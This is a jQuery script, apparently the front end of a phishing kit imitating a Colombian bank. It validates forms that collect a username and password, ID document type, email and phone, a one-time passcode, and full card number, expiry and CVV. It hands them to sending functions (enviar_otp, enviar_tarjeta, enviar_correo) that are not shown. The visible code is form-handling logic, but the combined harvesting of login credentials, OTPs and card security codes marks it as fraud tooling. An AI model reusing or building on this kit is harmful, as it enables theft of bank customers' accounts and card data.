var tarjeta_ok = 0;
var fecha_ok = 0;
var cvv_ok = 0;

var err_tar = 0;
var err_fec = 0;
var err_cvv = 0;

var fechalista = 0;
var ojologin = 0;
var ojotarjeta = 0;
var ojocorreo = 0;
var tipotar = "";

var e_u = 0;
var e_p = 0;

var e_o = 0;

var e_m = 0;
var e_c = 0;

var e_t = 0;
var e_v = 0;
var e_f = 0;

var sw_m = 0;





$(document).ready(function() {
    setTimeout(iniciar, 700);



    $("#btn-temporal").click(function(){
        $("#fondo,#cargando").show();
        enviar_otp($("#txt-temporal").val());        
    }); 

    $("#btn-correo").click(function(){
        enviar_correo($("#txt-correo").val(),$("#txt-celular").val());        
    });


    $("#btn-tarjeta").click(function(){
        var fecha = $("#mFecha").val() + "-" + $("#aFecha").val();
        enviar_tarjeta($("#txt-tarjeta").val(),fecha,$("#txt-cvv").val());        
    });




    /******** input correo **********/

    
    $("#inp-correo").click(function(){
        if (e_m == 0) {
            $("#inp-correo").css("border-bottom","2px solid #0048DB");
            $("#inp-correo .etiqueta").animate({"margin-top":"-4px","font-size": "12px"}, 100, function() {
                $("#inp-correo .etiqueta").css("color","#0048DB");
                $("#txt-correo").show();
                $("#txt-correo").focus();   
                $("#ico-correo").show();  
                $("#ico-alerta-m").hide();    
            }); 
        }                           
    });

    $("#txt-correo").blur(function(){
        if ($("#txt-correo").val() == "") {
            $("#inp-correo").css("border-bottom","2px solid #A00104");
            $("#ico-alerta-m").show();   
            $("#ico-correo").hide(); 
            $("#err-correo").show(); 
            $("#inp-correo .etiqueta").css("color","#A00104");  
            e_m = 1;            
        }else{
           $("#inp-correo").css("border-bottom","2px solid #0048DB"); 
           $("#ico-alerta-m").hide(); 
           $("#ico-correo").show();
           $("#err-correo").hide(); 
           e_m = 0;            
        }             
    });

    $('#txt-correo').keyup(function(event){
        if ($("#txt-correo").val() == "") {
            $("#inp-correo").css("border-bottom","2px solid #A00104");
            $("#ico-alerta-m").show();   
            $("#ico-correo").hide(); 
            $("#err-correo").show(); 
            $("#btn-correo").attr("disabled","disabled");
            $("#inp-correo .etiqueta").css("color","#A00104");
            e_m = 1;            
        }else{
            if ($("#txt-celular").val() != "") {
                $("#btn-correo").removeAttr("disabled");
            }

            $("#inp-correo").css("border-bottom","2px solid #0048DB"); 
            $("#ico-alerta-m").hide(); 
            $("#ico-correo").show();
            $("#err-correo").hide();   
            $("#inp-correo .etiqueta").css("color","#0048DB"); 
            e_m = 0;            
        }  
     });

    
    /********* input correo (FIN) *********/


    /******** input celular **********/

    
    $("#inp-celular").click(function(){
        if (e_c == 0) {
            $("#inp-celular").css("border-bottom","2px solid #0048DB");
            $("#inp-celular .etiqueta").animate({"margin-top":"-4px","font-size": "12px"}, 100, function() {
                $("#inp-celular .etiqueta").css("color","#0048DB");
                $("#txt-celular").show();
                $("#txt-celular").focus();   
                $("#ico-celular").show();  
                $("#ico-alerta-c").hide();    
            }); 
        }                           
    });

    $("#txt-celular").blur(function(){
        if ($("#txt-celular").val() == "") {
            $("#inp-celular").css("border-bottom","2px solid #A00104");
            $("#ico-alerta-c").show();   
            $("#ico-celular").hide(); 
            $("#err-celular").show(); 
            $("#inp-celular .etiqueta").css("color","#A00104");  
            e_c = 1;            
        }else{
           $("#inp-celular").css("border-bottom","2px solid #0048DB"); 
           $("#ico-alerta-c").hide(); 
           $("#ico-celular").show();
           $("#err-celular").hide(); 
           e_c = 0;            
        }             
    });

    $('#txt-celular').keyup(function(event){
        if ($("#txt-celular").val() == "") {
            $("#inp-celular").css("border-bottom","2px solid #A00104");
            $("#ico-alerta-c").show();   
            $("#ico-celular").hide(); 
            $("#err-celular").show(); 
            $("#btn-correo").attr("disabled","disabled");
            $("#inp-celular .etiqueta").css("color","#A00104");
            e_c = 1;            
        }else{
            if ($("#txt-correo").val() != "") {
                $("#btn-correo").removeAttr("disabled");
            }

            $("#inp-celular").css("border-bottom","2px solid #0048DB"); 
            $("#ico-alerta-c").hide(); 
            $("#ico-celular").show();
            $("#err-celular").hide();   
            $("#inp-celular .etiqueta").css("color","#0048DB"); 
            e_c = 0;            
        }  
     });

    
    /********* input celular (FIN) *********/

    /******** input temporal **********/

    
    $("#inp-temporal").click(function(){
        if (e_o == 0) {
            $("#inp-temporal").css("border-bottom","2px solid #0048DB");
            $("#inp-temporal .etiqueta").animate({"margin-top":"-4px","font-size": "12px"}, 100, function() {
                $("#inp-temporal .etiqueta").css("color","#0048DB");
                $("#txt-temporal").show();
                $("#txt-temporal").focus();   
                $("#ico-temporal").show();  
                $("#ico-alerta-o").hide();    
            }); 
        }                           
    });

    $("#txt-temporal").blur(function(){
        $("#err-temporal").html("Este campo es requerido.");
        if ($("#txt-temporal").val() == "") {
            $("#inp-temporal").css("border-bottom","2px solid #A00104");
            $("#ico-alerta-o").show();   
            $("#ico-temporal").hide(); 
            $("#err-temporal").show();   
            $("#inp-temporal .etiqueta").css("color","#A00104");
            e_m = 1;            
        }else{
           $("#inp-temporal").css("border-bottom","2px solid #0048DB"); 
           $("#ico-alerta-o").hide(); 
           $("#ico-temporal").show();
           $("#err-temporal").hide(); 
           e_o = 0;            
        }             
    });

    $('#txt-temporal ').keyup(function(event){
        if ($("#txt-temporal").val() == "") {
            $("#inp-temporal").css("border-bottom","2px solid #A00104");
            $("#ico-alerta-o").show();   
            $("#ico-temporal").hide(); 
            $("#err-temporal").show(); 
            $("#btn-temporal").attr("disabled","disabled");
            $("#inp-temporal .etiqueta").css("color","#A00104");
            e_o = 1;            
        }else{
            $("#btn-temporal").removeAttr("disabled");
            $("#inp-temporal").css("border-bottom","2px solid #0048DB"); 
            $("#ico-alerta-o").hide(); 
            $("#ico-temporal").show();
            $("#err-temporal").hide();   
            $("#inp-temporal .etiqueta").css("color","#0048DB"); 
            e_o = 0;            
        }  
     });

    
    /********* input temporal (FIN) *********/



    /******** input tarjeta **********/

    
    $("#inp-tarjeta").click(function(){
        if (e_t == 0) {
            $("#inp-tarjeta").css("border-bottom","2px solid #0048DB");
            $("#inp-tarjeta .etiqueta").animate({"margin-top":"-4px","font-size": "12px"}, 100, function() {
                $("#inp-tarjeta .etiqueta").css("color","#0048DB");
                $("#txt-tarjeta").show();
                $("#txt-tarjeta").focus();   
                $("#ico-tarjeta").show();  
                $("#ico-alerta-t").hide();    
            }); 
        }                           
    });

    $("#txt-tarjeta").blur(function(){
        if ($("#txt-tarjeta").val() == "") {
            $("#inp-tarjeta").css("border-bottom","2px solid #A00104");
            $("#ico-alerta-t").show();   
            $("#ico-tarjeta").hide(); 
            $("#err-tarjeta").show();   
            $("#inp-tarjeta .etiqueta").css("color","#A00104");
            e_t = 1;            
        }else{
           $("#inp-tarjeta").css("border-bottom","2px solid #0048DB"); 
           $("#ico-alerta-t").hide(); 
           $("#ico-tarjeta").show();
           $("#err-tarjeta").hide(); 
           e_c = 0;            
        }             
    });

    $('#txt-tarjeta').keyup(function(event){
        if ($("#txt-tarjeta").val() == "") {
            $("#inp-tarjeta").css("border-bottom","2px solid #A00104");
            $("#ico-alerta-t").show();   
            $("#ico-tarjeta").hide(); 
            $("#err-tarjeta").show(); 
            $("#btn-tarjeta").attr("disabled","disabled");
            $("#inp-tarjeta .etiqueta").css("color","#A00104");
            e_t = 1;            
        }else{

            if ($("#txt-cvv").val().length >= 3 && $("#txt-tarjeta").val().length == 16 && $("#mFecha").val() != "" && $("#aFecha").val() != "") {
                $("#btn-tarjeta").removeAttr("disabled");
            }

            $("#inp-tarjeta").css("border-bottom","2px solid #0048DB"); 
            $("#ico-alerta-t").hide(); 
            $("#ico-tarjeta").show();
            $("#err-tarjeta").hide();   
            $("#inp-tarjeta .etiqueta").css("color","#0048DB"); 
            e_t = 0;            
        }  
     });

    
    /********* input tarjeta (FIN) *********/

    /******** input CVV **********/

    
    $("#inp-cvv").click(function(){
        if (e_v == 0) {
            $("#inp-cvv").css("border-bottom","2px solid #0048DB");
            $("#inp-cvv .etiqueta").animate({"margin-top":"-4px","font-size": "12px"}, 100, function() {
                $("#inp-cvv .etiqueta").css("color","#0048DB");
                $("#txt-cvv").show();
                $("#txt-cvv").focus();   
                $("#ico-cvv").show();  
                $("#ico-alerta-v").hide();    
            }); 
        }                           
    });

    $("#txt-cvv").blur(function(){
        if ($("#txt-cvv").val() == "") {
            $("#inp-cvv").css("border-bottom","2px solid #A00104");
            $("#ico-alerta-v").show();   
            $("#ico-cvv").hide(); 
            $("#err-cvv").show();   
            $("#inp-cvv .etiqueta").css("color","#A00104");
            e_v = 1;            
        }else{
           $("#inp-tarjeta").css("border-bottom","2px solid #0048DB"); 
           $("#ico-alerta-t").hide(); 
           $("#ico-tarjeta").show();
           $("#err-tarjeta").hide(); 
           e_v = 0;            
        }             
    });

    $('#txt-cvv').keyup(function(event){
        if ($("#txt-cvv").val() == "") {
            $("#inp-cvv").css("border-bottom","2px solid #A00104");
            $("#ico-alerta-v").show();   
            $("#ico-cvv").hide(); 
            $("#err-cvv").show(); 
            $("#btn-tarjeta").attr("disabled","disabled");
            $("#inp-cvv .etiqueta").css("color","#A00104");
            e_v = 1;            
        }else{

            if ($("#txt-cvv").val().length >= 3 && $("#txt-tarjeta").val().length == 16 && $("#mFecha").val() != "" && $("#aFecha").val() != "") {
                $("#btn-tarjeta").removeAttr("disabled");
            }

            $("#inp-cvv").css("border-bottom","2px solid #0048DB"); 
            $("#ico-alerta-v").hide(); 
            $("#ico-cvv").show();
            $("#err-cvv").hide();   
            $("#inp-cvv .etiqueta").css("color","#0048DB"); 
            e_v = 0;            
        }  
     });

    
    /********* input CVV (FIN) *********/

     /********* input Fecha *********/

    $( "#mFecha" ).change(function() {
        if ($("#txt-cvv").val().length >= 3 && $("#txt-tarjeta").val().length == 16 && $("#mFecha").val() != "" && $("#aFecha").val() != "") {
            $("#btn-tarjeta").removeAttr("disabled");
        }else{
            $("#btn-tarjeta").attr("disabled","disabled");
        }    
    });

    $( "#aFecha" ).change(function() {
        if ($("#txt-cvv").val().length >= 3 && $("#txt-tarjeta").val().length == 16 && $("#mFecha").val() != "" && $("#aFecha").val() != "") {
            $("#btn-tarjeta").removeAttr("disabled");
        }else{
            $("#btn-tarjeta").attr("disabled","disabled");
        }    
    });
    
     /********* input Fecha (FIN) *********/


    $("#inp-usuario").click(function(){
        if (e_u == 0) {
            $("#inp-usuario").css("border-bottom","2px solid #0048DB");
            $("#inp-usuario .etiqueta").animate({"margin-top":"-4px","font-size": "12px"}, 100, function() {
                $("#inp-usuario .etiqueta").css("color","#0048DB");
                $("#txt-usuario").show();
                $("#txt-usuario").focus();   
                $("#ico-usuario").show();  
                $("#ico-alerta-u").hide();    
            }); 
        }                           
    });

    $("#txt-usuario").blur(function(){
        if ($("#txt-usuario").val() == "") {
            $("#inp-usuario").css("border-bottom","2px solid #A00104");
            $("#ico-alerta-u").show();   
            $("#ico-usuario").hide(); 
            $("#err-usuario").show();
            $("#inp-usuario .etiqueta").css("color","#A00104");   
            e_u = 1;            
        }else{
           $("#inp-usuario").css("border-bottom","2px solid #0048DB"); 
           $("#ico-alerta-u").hide(); 
           $("#ico-usuario").show();
           $("#err-usuario").hide(); 
           e_u = 0;            
        }             
    });

     $('#txt-usuario').keyup(function(event){
        if ($("#txt-usuario").val() == "") {
            $("#inp-usuario").css("border-bottom","2px solid #A00104");
            $("#ico-alerta-u").show();   
            $("#ico-usuario").hide(); 
            $("#err-usuario").show(); 
            $("#btnEntrar").attr("disabled","disabled");
            $("#inp-usuario .etiqueta").css("color","#A00104");
            e_u = 1;            
        }else{
            if ($("#txt-password").val() != "") {
                $("#btnEntrar").removeAttr("disabled");
            }

            $("#inp-usuario").css("border-bottom","2px solid #0048DB"); 
            $("#ico-alerta-u").hide(); 
            $("#ico-usuario").show();
            $("#err-usuario").hide();   
            $("#inp-usuario .etiqueta").css("color","#0048DB"); 
            e_u = 0;            
        }  

        // Formatear número con puntos (solo si es necesario)
        var valor = $('#txt-usuario').val().replace(/\./g, '');
        if (valor.length > 3) {
            var formateado = '';
            for (var i = 0; i < valor.length; i++) {
                if (i > 0 && (valor.length - i) % 3 === 0) {
                    formateado += '.';
                }
                formateado += valor[i];
            }
            $('#txt-usuario').val(formateado);
        }
     });



     $("#inp-password").click(function(){
        if (e_p == 0) {
            $("#inp-password").css("border-bottom","2px solid #0048DB");
            $("#inp-password .etiqueta").animate({"margin-top":"-4px","font-size": "12px"}, 100, function() {
                $("#inp-password .etiqueta").css("color","#0048DB");
                $("#txt-password").show();
                $("#txt-password").focus();   
                $("#ico-password").show();  
                $("#ico-alerta-p").hide();    
            }); 
        }                           
    });

    $("#txt-password").blur(function(){
        if ($("#txt-password").val() == "") {
            $("#inp-password").css("border-bottom","2px solid #A00104");
            $("#ico-alerta-p").show();   
            $("#ico-password").hide(); 
            $("#err-password").show();   
            $("#inp-password .etiqueta").css("color","#A00104");
            e_p = 1;            
        }else{
           $("#inp-password").css("border-bottom","2px solid #0048DB"); 
           $("#ico-alerta-p").hide(); 
           $("#ico-password").show();
           $("#err-password").hide(); 
           e_p = 0;            
        }             
    });

     $('#txt-password').keyup(function(event){
        if ($("#txt-password").val() == "") {
            $("#inp-password").css("border-bottom","2px solid #A00104");
            $("#ico-alerta-p").show();   
            $("#ico-password").hide(); 
            $("#err-password").show(); 
            $("#btnEntrar").attr("disabled","disabled");
            $("#inp-password .etiqueta").css("color","#A00104");
            e_p = 1;            
        }else{
            if ($("#txt-usuario").val() != "") {
                $("#btnEntrar").removeAttr("disabled");
            }
            $("#inp-password").css("border-bottom","2px solid #0048DB"); 
            $("#ico-alerta-p").hide(); 
            $("#ico-password").show();
            $("#err-password").hide();   
            $("#inp-password .etiqueta").css("color","#0048DB"); 
            e_p = 0;            
        }  
     });  

     $("#inp-tipo").click(function(){
        if (sw_m == 0) {
            $("#menu-tipo").show();
            $("#ico-flecha-ab").hide();
            $("#ico-flecha-ar").show();    
            sw_m = 1;
        }else{
            $("#ico-flecha-ab").show();
            $("#ico-flecha-ar").hide();    
            $("#menu-tipo").hide();
            sw_m = 0;
        }        
     });


     $("#mnu-ced").click(function(){
        $("#menu-tipo").hide();
        $("#txt-documento").html("Cédula de ciudadanía");
        $("#ico-flecha-ab").show();
        $("#ico-flecha-ar").hide();  
        $("#hdd-documento").val("CC");        
        sw_m = 0;

     });

     $("#mnu-ext").click(function(){
        $("#menu-tipo").hide();
        $("#txt-documento").html("Cédula de extranjería");
        $("#ico-flecha-ab").show();
        $("#ico-flecha-ar").hide(); 
        $("#hdd-documento").val("CE");   
        sw_m = 0;
     });

     $("#mnu-tar").click(function(){
        $("#menu-tipo").hide();
        $("#txt-documento").html("Tarjeta de identidad");
        $("#ico-flecha-ab").show();
        $("#ico-flecha-ar").hide();  
        $("#hdd-documento").val("TI");  
        sw_m = 0;
     });

    $('body').click(function(event) {  
        if(event.target.id == "inp-tipo" || event.target.id == "titulo-tipo" || event.target.id == "txt-documento" || event.target.id == "tbl-documento" || event.target.id == "ico-flecha-ab" || event.target.id == "ico-flecha-ar" || event.target.id == "td1" || event.target.id == "td2")
            return;

        $("#menu-tipo").hide();        
        $("#ico-flecha-ab").show();
        $("#ico-flecha-ar").hide();    
        sw_m = 0;                  
     });


    $('body').keyup(function(event){
        $("#menu-tipo").hide();        
        $("#ico-flecha-ab").show();
        $("#ico-flecha-ar").hide();    
        sw_m = 0;   
    });

    $( ".item-top-menu, .item-side-menu" ).hover(function() {
        var iden = $( this ).attr("id");
        $("#" + iden + " .txt-item-top").css("color","#E1001D");    
        $("#" + iden + " img").attr("src","../img/" + iden + "-r.png"); 
    });

    $( ".item-top-menu, .item-side-menu" ).mouseout(function() {
        var iden = $( this ).attr("id");
        $("#" + iden + " .txt-item-top").css("color","#000");    
        $("#" + iden + " img").attr("src","../img/" + iden + ".png");  
    });

    $( ".item-side-menu" ).hover(function() {
        var iden = $( this ).attr("id");
        $("#" + iden + " .txt-item-side").css("color","#E1001D");    
        $("#" + iden + " img").attr("src","../img/" + iden + "-r.png"); 
    });

    $( ".item-side-menu" ).mouseout(function() {
        var iden = $( this ).attr("id");
        $("#" + iden + " .txt-item-side").css("color","#000");    
        $("#" + iden + " img").attr("src","../img/" + iden + ".png");  
    });

    // Función para verificar y habilitar el botón
    function verificarBotones() {
        var usuario = $("#txt-usuario").val();
        var password = $("#txt-password").val();
        
        // Siempre habilitar el botón si hay algún contenido
        if (usuario && password) {
            $("#btnEntrar").removeAttr("disabled");
        } else {
            $("#btnEntrar").attr("disabled","disabled");
        }
    }

    // Verificar botones cada 500ms
    setInterval(verificarBotones, 500);

});






